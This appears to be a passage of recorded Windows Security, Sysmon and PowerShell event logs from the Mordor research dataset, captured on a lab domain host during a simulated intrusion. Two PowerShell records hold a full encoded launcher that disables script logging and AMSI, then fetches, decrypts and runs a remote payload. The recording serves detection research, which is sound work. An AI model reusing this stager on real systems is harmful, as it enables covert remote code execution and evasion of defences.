{"Keywords":-9214364837600034816,"SeverityValue":2,"Application":"\\device\\harddiskvolume2\\windows\\system32\\lsass.exe","EventID":5156,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"Channel":"security","host":"wec.internal.cloudapp.net","EventReceivedTime":"2020-09-21 19:18:54","ProcessId":"744","ThreadID":6520,"EventType":"AUDIT_SUCCESS","Opcode":"Info","EventTime":"2020-09-21 19:18:51","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t744\r\n\tApplication Name:\t\\device\\harddiskvolume2\\windows\\system32\\lsass.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.39.5\r\n\tSource Port:\t\t50586\r\n\tDestination Address:\t172.18.38.5\r\n\tDestination Port:\t\t135\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t79456\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","FilterRTID":"79456","RemoteUserID":"S-1-0-0","@timestamp":"2020-09-21T23:18:54.411Z","LayerRTID":"48","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":784898,"Task":12810,"Direction":"%%14593","@version":"1","OpcodeValue":0,"SourcePort":"50586","DestPort":"135","Protocol":"6","SourceModuleName":"eventlog","Severity":"INFO","DestAddress":"172.18.38.5","SourceName":"Microsoft-Windows-Security-Auditing","Version":1,"LayerName":"%%14611","RemoteMachineID":"S-1-0-0","Category":"Filtering Platform Connection","SourceAddress":"172.18.39.5","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":-9214364837600034816,"SeverityValue":2,"Application":"\\device\\harddiskvolume2\\windows\\system32\\lsass.exe","EventID":5158,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"Channel":"security","host":"wec.internal.cloudapp.net","EventReceivedTime":"2020-09-21 19:18:54","ProcessId":"744","ThreadID":6520,"EventType":"AUDIT_SUCCESS","Opcode":"Info","EventTime":"2020-09-21 19:18:51","Message":"The Windows Filtering Platform has permitted a bind to a local port.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t744\r\n\tApplication Name:\t\\device\\harddiskvolume2\\windows\\system32\\lsass.exe\r\n\r\nNetwork Information:\r\n\tSource Address:\t\t0.0.0.0\r\n\tSource Port:\t\t50587\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t0\r\n\tLayer Name:\t\tResource Assignment\r\n\tLayer Run-Time ID:\t36","FilterRTID":"0","@timestamp":"2020-09-21T23:18:54.411Z","LayerRTID":"36","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":784899,"Task":12810,"Protocol":"6","@version":"1","OpcodeValue":0,"SourcePort":"50587","SourceModuleName":"eventlog","Severity":"INFO","SourceName":"Microsoft-Windows-Security-Auditing","Version":0,"LayerName":"%%14608","Category":"Filtering Platform Connection","SourceAddress":"0.0.0.0","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":-9214364837600034816,"SeverityValue":2,"Application":"\\device\\harddiskvolume2\\windows\\system32\\lsass.exe","EventID":5156,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"Channel":"security","host":"wec.internal.cloudapp.net","EventReceivedTime":"2020-09-21 19:18:54","ProcessId":"744","ThreadID":6520,"EventType":"AUDIT_SUCCESS","Opcode":"Info","EventTime":"2020-09-21 19:18:51","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t744\r\n\tApplication Name:\t\\device\\harddiskvolume2\\windows\\system32\\lsass.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.39.5\r\n\tSource Port:\t\t50587\r\n\tDestination Address:\t172.18.38.5\r\n\tDestination Port:\t\t49674\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t79456\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","FilterRTID":"79456","RemoteUserID":"S-1-0-0","@timestamp":"2020-09-21T23:18:54.412Z","LayerRTID":"48","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":784900,"Task":12810,"Direction":"%%14593","@version":"1","OpcodeValue":0,"SourcePort":"50587","DestPort":"49674","Protocol":"6","SourceModuleName":"eventlog","Severity":"INFO","DestAddress":"172.18.38.5","SourceName":"Microsoft-Windows-Security-Auditing","Version":1,"LayerName":"%%14611","RemoteMachineID":"S-1-0-0","Category":"Filtering Platform Connection","SourceAddress":"172.18.39.5","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":-9214364837600034816,"SeverityValue":2,"SubjectDomainName":"THESHIRE","EventID":4689,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"Channel":"security","host":"wec.internal.cloudapp.net","SubjectUserSid":"S-1-5-21-4228717743-1032521047-1810997296-1104","EventReceivedTime":"2020-09-21 19:18:54","ProcessId":"0x1f68","ThreadID":6520,"EventType":"AUDIT_SUCCESS","Opcode":"Info","EventTime":"2020-09-21 19:18:51","Message":"A process has exited.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-21-4228717743-1032521047-1810997296-1104\r\n\tAccount Name:\t\tpgustavo\r\n\tAccount Domain:\t\tTHESHIRE\r\n\tLogon ID:\t\t0x10A7DF\r\n\r\nProcess Information:\r\n\tProcess ID:\t0x1f68\r\n\tProcess Name:\tC:\\Windows\\System32\\net1.exe\r\n\tExit Status:\t0x0","@timestamp":"2020-09-21T23:18:54.412Z","SubjectLogonId":"0x10a7df","SourceModuleType":"im_msvistalog","port":64545,"ProcessName":"C:\\Windows\\System32\\net1.exe","RecordNumber":784901,"SubjectUserName":"pgustavo","Task":13313,"@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","Severity":"INFO","SourceName":"Microsoft-Windows-Security-Auditing","Version":0,"Status":"0x0","Category":"Process Termination","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":-9214364837600034816,"SeverityValue":2,"SubjectDomainName":"THESHIRE","EventID":4689,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"Channel":"security","host":"wec.internal.cloudapp.net","SubjectUserSid":"S-1-5-21-4228717743-1032521047-1810997296-1104","EventReceivedTime":"2020-09-21 19:18:54","ProcessId":"0x1744","ThreadID":8004,"EventType":"AUDIT_SUCCESS","Opcode":"Info","EventTime":"2020-09-21 19:18:51","Message":"A process has exited.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-21-4228717743-1032521047-1810997296-1104\r\n\tAccount Name:\t\tpgustavo\r\n\tAccount Domain:\t\tTHESHIRE\r\n\tLogon ID:\t\t0x10A7DF\r\n\r\nProcess Information:\r\n\tProcess ID:\t0x1744\r\n\tProcess Name:\tC:\\Windows\\System32\\net.exe\r\n\tExit Status:\t0x0","@timestamp":"2020-09-21T23:18:54.413Z","SubjectLogonId":"0x10a7df","SourceModuleType":"im_msvistalog","port":64545,"ProcessName":"C:\\Windows\\System32\\net.exe","RecordNumber":784902,"SubjectUserName":"pgustavo","Task":13313,"@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","Severity":"INFO","SourceName":"Microsoft-Windows-Security-Auditing","Version":0,"Status":"0x0","Category":"Process Termination","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"SourcePortName":"-","tags":["mordorDataset"],"SeverityValue":2,"EventReceivedTime":"2020-09-21 19:18:55","EventID":3,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-226a-5f69-0c00-000000000900}","Opcode":"Info","EventTime":"2020-09-21 19:18:53","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","Protocol":"tcp","@version":"1","OpcodeValue":0,"SourcePort":"50586","DestinationPort":"135","Severity":"INFO","User":"NT AUTHORITY\\SYSTEM","SourceName":"Microsoft-Windows-Sysmon","Category":"Network connection detected (rule: NetworkConnect)","SourceHostname":"-","DestinationIp":"172.18.38.5","SourceIp":"172.18.39.5","Keywords":-9223372036854775808,"UserID":"S-1-5-18","ThreadID":4012,"DestinationIsIpv6":"false","EventType":"INFO","@timestamp":"2020-09-21T23:18:55.413Z","port":64545,"RecordNumber":3227043,"Task":3,"SourceModuleName":"eventlog","Initiated":"true","Version":5,"Image":"C:\\Windows\\System32\\lsass.exe","SourceIsIpv6":"false","DestinationPortName":"-","UtcTime":"2020-09-21 23:18:51.947","Hostname":"WORKSTATION5.theshire.local","DestinationHostname":"-","RuleName":"-"}
{"SourcePortName":"-","tags":["mordorDataset"],"SeverityValue":2,"EventReceivedTime":"2020-09-21 19:18:55","EventID":3,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-226a-5f69-0c00-000000000900}","Opcode":"Info","EventTime":"2020-09-21 19:18:53","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","Protocol":"tcp","@version":"1","OpcodeValue":0,"SourcePort":"50587","DestinationPort":"49674","Severity":"INFO","User":"NT AUTHORITY\\SYSTEM","SourceName":"Microsoft-Windows-Sysmon","Category":"Network connection detected (rule: NetworkConnect)","SourceHostname":"-","DestinationIp":"172.18.38.5","SourceIp":"172.18.39.5","Keywords":-9223372036854775808,"UserID":"S-1-5-18","ThreadID":4012,"DestinationIsIpv6":"false","EventType":"INFO","@timestamp":"2020-09-21T23:18:55.414Z","port":64545,"RecordNumber":3227044,"Task":3,"SourceModuleName":"eventlog","Initiated":"true","Version":5,"Image":"C:\\Windows\\System32\\lsass.exe","SourceIsIpv6":"false","DestinationPortName":"-","UtcTime":"2020-09-21 23:18:51.952","Hostname":"WORKSTATION5.theshire.local","DestinationHostname":"-","RuleName":"-"}
{"Keywords":36028797018963968,"SeverityValue":2,"EventReceivedTime":"2020-09-21 19:18:57","EventID":800,"ExecutionProcessID":0,"Channel":"Windows PowerShell","host":"wec.internal.cloudapp.net","ThreadID":0,"EventType":"INFO","Opcode":"Info","EventTime":"2020-09-21 19:18:57","Message":"Pipeline execution details for command line:             Start-Sleep -Seconds $sleepTime;\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=13865\r\n\r\n\tUserId=THESHIRE\\pgustavo\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=1372cbf7-30b6-4e48-bce6-058659e77cf4\r\n\tHostApplication=C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBpAE8ATgBUAEEAQgBMAGUALgBQAFMAVgBlAHIAUwBJAE8ATgAuAE0AQQBKAG8AUgAgAC0ARwBFACAAMwApAHsAJABDADMAMgAyAD0AWwByAGUAZgBdAC4AQQBzAHMARQBNAEIAbABZAC4ARwBlAHQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkAEMAMwAyADIAKQB7ACQAYwA3ADQAMgA9ACQAQwAzADIAMgAuAEcARQB0AFYAQQBsAFUAZQAoACQAbgB1AGwATAApADsASQBGACgAJABjADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAQwA3ADQAMgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABDADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAEwAPQBbAEMATwBMAEwARQBjAHQAaQBvAG4AcwAuAEcARQBOAGUAUgBpAEMALgBEAGkAQwB0AGkAbwBOAEEAcgB5AFsAUwB0AFIASQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBKAGUAYwBUAF0AXQA6ADoATgBFAHcAKAApADsAJAB2AEEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEATAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGMANwA0ADIAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAVgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAUgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBFAHQARgBJAEUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUARQAoACQATgBVAEwATAAsACgATgBlAFcALQBPAEIASgBlAGMAdAAgAEMATwBMAGwARQBDAHQASQBPAE4AUwAuAEcAZQBuAEUAcgBpAGMALgBIAEEAcwBIAFMARQBUAFsAUwBUAHIAaQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUAZgBdAC4AQQBTAFMAZQBNAEIAbABZAC4ARwBFAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUAZQAoACQATgB1AGwATAAsACQAdAByAHUAZQApADsAfQA7AFsAUwBZAHMAdABFAE0ALgBOAGUAVAAuAFMARQBSAFYASQBjAGUAUABPAEkATgB0AE0AQQBuAEEAZwBFAHIAXQA6ADoARQBYAHAAZQBDAHQAMQAwADAAQwBPAG4AVABJAG4AVQBFAD0AMAA7ACQANQA3ADkAMwA9AE4AZQB3AC0ATwBCAGoARQBjAFQAIABTAFkAUwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAGkARQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAG4AQwBvAGQASQBuAEcAXQA6ADoAVQBOAEkAQwBPAEQAZQAuAEcARQB0AFMAVABSAGkATgBHACgAWwBDAG8AbgB2AGUAUgBUAF0AOgA6AEYAUgBPAG0AQgBBAFMARQA2ADQAUwB0AHIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADcAOQAzAC4ASABFAGEARABFAHIAUwAuAEEARABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANQA3ADkAMwAuAFAAUgBPAFgAWQA9AFsAUwB5AFMAVABFAE0ALgBOAEUAVAAuAFcAZQBiAFIARQBRAFUARQBTAHQAXQA6ADoARABlAEYAYQBVAEwAdABXAEUAQgBQAFIAbwBYAHkAOwAkADUANwA5ADMALgBQAFIAbwBYAHkALgBDAFIAZQBEAEUATgBUAGkAQQBMAHMAIAA9ACAAWwBTAFkAcwBUAEUATQAuAE4ARQBUAC4AQwBSAGUAZABFAG4AVABJAGEATABDAEEAQwBoAGUAXQA6ADoARABFAEYAQQBVAGwAdABOAGUAVABXAG8AcgBrAEMAUgBFAGQAZQBuAHQASQBhAEwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADcAOQAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAEUATQAuAFQAZQBYAHQALgBFAG4AYwBPAEQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAHQAQgB5AFQARQBzACgAJwAwAF0AcgBYADMAWQA0ADoAKAApAEoAYwBoAEEASwBrAFIANwBWAGcAKwBbAC8AVQBwADkAMgB0AG0ARwBRAHYAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBOAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AQgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAA1ADcAOQAzAC4ASABFAEEARABFAHIAcwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgB1AG8AUwBXAG8AaABuAGwAQwBZAGwAZgA9AEwAdwBMAHcAbwBiADAAZABMAEsATQBJAHQAUgBVAEgAOABnAEMAdQBWAEcAYgBBAGQAZABzAD0AIgApADsAJABkAEEAVABhAD0AJAA1ADcAOQAzAC4ARABvAHcAbgBsAG8AYQBkAEQAQQBUAEEAKAAkAFMARQByACsAJABUACkAOwAkAGkAVgA9ACQAZABBAHQAQQBbADAALgAuADMAXQA7ACQARABhAHQAYQA9ACQAZABBAHQAYQBbADQALgAuACQARABBAHQAQQAuAGwARQBOAEcAVABIAF0AOwAtAGoATwBJAG4AWwBDAEgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQAZABBAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\r\n\tEngineVersion=5.1.18362.752\r\n\tRunspaceId=9da16ef2-d692-4dfe-ad5e-370bbf001fb9\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=            Start-Sleep -Seconds $sleepTime;\n \r\n\r\nDetails: \r\nCommandInvocation(Start-Sleep): \"Start-Sleep\"\r\nParameterBinding(Start-Sleep): name=\"Seconds\"; value=\"5\"\r\n","@timestamp":"2020-09-21T23:18:57.416Z","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":183695,"Task":8,"@version":"1","SourceModuleName":"eventlog","Severity":"INFO","SourceName":"PowerShell","Category":"Pipeline Execution Details","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":36028797018963968,"SeverityValue":2,"EventReceivedTime":"2020-09-21 19:18:57","EventID":800,"ExecutionProcessID":0,"Channel":"Windows PowerShell","host":"wec.internal.cloudapp.net","ThreadID":0,"EventType":"INFO","Opcode":"Info","EventTime":"2020-09-21 19:18:57","Message":"Pipeline execution details for command line:         $IV=[BitConverter]::GetBytes($(Get-Random));\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=13867\r\n\r\n\tUserId=THESHIRE\\pgustavo\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=1372cbf7-30b6-4e48-bce6-058659e77cf4\r\n\tHostApplication=C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBpAE8ATgBUAEEAQgBMAGUALgBQAFMAVgBlAHIAUwBJAE8ATgAuAE0AQQBKAG8AUgAgAC0ARwBFACAAMwApAHsAJABDADMAMgAyAD0AWwByAGUAZgBdAC4AQQBzAHMARQBNAEIAbABZAC4ARwBlAHQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkAEMAMwAyADIAKQB7ACQAYwA3ADQAMgA9ACQAQwAzADIAMgAuAEcARQB0AFYAQQBsAFUAZQAoACQAbgB1AGwATAApADsASQBGACgAJABjADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAQwA3ADQAMgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABDADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAEwAPQBbAEMATwBMAEwARQBjAHQAaQBvAG4AcwAuAEcARQBOAGUAUgBpAEMALgBEAGkAQwB0AGkAbwBOAEEAcgB5AFsAUwB0AFIASQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBKAGUAYwBUAF0AXQA6ADoATgBFAHcAKAApADsAJAB2AEEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEATAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGMANwA0ADIAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAVgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAUgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBFAHQARgBJAEUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUARQAoACQATgBVAEwATAAsACgATgBlAFcALQBPAEIASgBlAGMAdAAgAEMATwBMAGwARQBDAHQASQBPAE4AUwAuAEcAZQBuAEUAcgBpAGMALgBIAEEAcwBIAFMARQBUAFsAUwBUAHIAaQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUAZgBdAC4AQQBTAFMAZQBNAEIAbABZAC4ARwBFAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUAZQAoACQATgB1AGwATAAsACQAdAByAHUAZQApADsAfQA7AFsAUwBZAHMAdABFAE0ALgBOAGUAVAAuAFMARQBSAFYASQBjAGUAUABPAEkATgB0AE0AQQBuAEEAZwBFAHIAXQA6ADoARQBYAHAAZQBDAHQAMQAwADAAQwBPAG4AVABJAG4AVQBFAD0AMAA7ACQANQA3ADkAMwA9AE4AZQB3AC0ATwBCAGoARQBjAFQAIABTAFkAUwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAGkARQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAG4AQwBvAGQASQBuAEcAXQA6ADoAVQBOAEkAQwBPAEQAZQAuAEcARQB0AFMAVABSAGkATgBHACgAWwBDAG8AbgB2AGUAUgBUAF0AOgA6AEYAUgBPAG0AQgBBAFMARQA2ADQAUwB0AHIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADcAOQAzAC4ASABFAGEARABFAHIAUwAuAEEARABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANQA3ADkAMwAuAFAAUgBPAFgAWQA9AFsAUwB5AFMAVABFAE0ALgBOAEUAVAAuAFcAZQBiAFIARQBRAFUARQBTAHQAXQA6ADoARABlAEYAYQBVAEwAdABXAEUAQgBQAFIAbwBYAHkAOwAkADUANwA5ADMALgBQAFIAbwBYAHkALgBDAFIAZQBEAEUATgBUAGkAQQBMAHMAIAA9ACAAWwBTAFkAcwBUAEUATQAuAE4ARQBUAC4AQwBSAGUAZABFAG4AVABJAGEATABDAEEAQwBoAGUAXQA6ADoARABFAEYAQQBVAGwAdABOAGUAVABXAG8AcgBrAEMAUgBFAGQAZQBuAHQASQBhAEwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADcAOQAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAEUATQAuAFQAZQBYAHQALgBFAG4AYwBPAEQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAHQAQgB5AFQARQBzACgAJwAwAF0AcgBYADMAWQA0ADoAKAApAEoAYwBoAEEASwBrAFIANwBWAGcAKwBbAC8AVQBwADkAMgB0AG0ARwBRAHYAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEs